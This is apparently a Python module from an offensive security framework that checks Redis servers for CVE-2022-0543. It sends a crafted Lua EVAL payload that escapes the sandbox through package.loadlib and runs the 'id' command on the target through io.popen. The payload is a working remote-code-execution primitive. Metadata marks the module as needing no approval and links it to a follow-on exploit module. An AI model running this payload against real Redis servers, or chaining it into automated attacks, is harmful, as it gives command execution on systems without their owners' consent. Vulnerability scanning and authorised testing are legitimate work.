#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Redis Lua sandbox escape RCE on Debian/Ubuntu packages (CVE-2022-0543)."""

import socket

from kittysploit import *
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client


_LUA_LIBS = (
    '/usr/lib/x86_64-linux-gnu/liblua5.1.so.0',
    '/usr/lib/aarch64-linux-gnu/liblua5.1.so.0',
    '/usr/lib/arm-linux-gnueabihf/liblua5.1.so.0',
    '/usr/lib/i386-linux-gnu/liblua5.1.so.0',
)


class Module(Scanner, Tcp_scanner_client):
    __info__ = {
        'name': 'Redis - Lua Sandbox Escape Detection (CVE-2022-0543)',
        'description': (
            'Detects CVE-2022-0543 on Debian/Ubuntu-packaged Redis by EVAL-loading '
            'liblua5.1 via package.loadlib and executing id/cat via io.popen.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'scanner', 'tcp', 'redis', 'cve', 'cve2022', 'rce', 'lua', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals'],
            'cost': 1.0,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['exploits/linux/redis/redis_cve_2022_0543_rce'],
            },
        },
        'references': [
            'https://www.debian.org/security/2022/dsa-5101',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-0543',
        ],
        'cve': 'CVE-2022-0543',
    }

    port = OptPort(6379, 'Redis port', True)

    def run(self):
        host = self._host()
        port = self._port()
        if not host or not self.is_tcp_open(host=host, port=port):
            return False
        sock = None
        try:
            sock = socket.create_connection((host, port), timeout=max(self._timeout(), 5.0))
            sock.settimeout(max(self._timeout(), 5.0))
            for lib in _LUA_LIBS:
                script = (
                    f'local io_l = package.loadlib("{lib}", "luaopen_io"); '
                    'local io = io_l(); local f = io.popen("id", "r"); '
                    'local res = f:read("*a"); f:close(); return res'
                )
                # RESP: EVAL <script> 0
                payload = (
                    f'*3\r\n$4\r\nEVAL\r\n${len(script)}\r\n{script}\r\n$1\r\n0\r\n'
                )
                sock.sendall(payload.encode())
                data = sock.recv(4096).decode('latin-1', errors='replace')
                if 'uid=' in data:
                    self.set_info(
                        severity='critical',
                        reason='Redis CVE-2022-0543 Lua sandbox escape confirmed',
                        lib=lib,
                    )
                    return True
        except OSError:
            return False
        finally:
            if sock is not None:
                try:
                    sock.close()
                except Exception:
                    pass
        return False
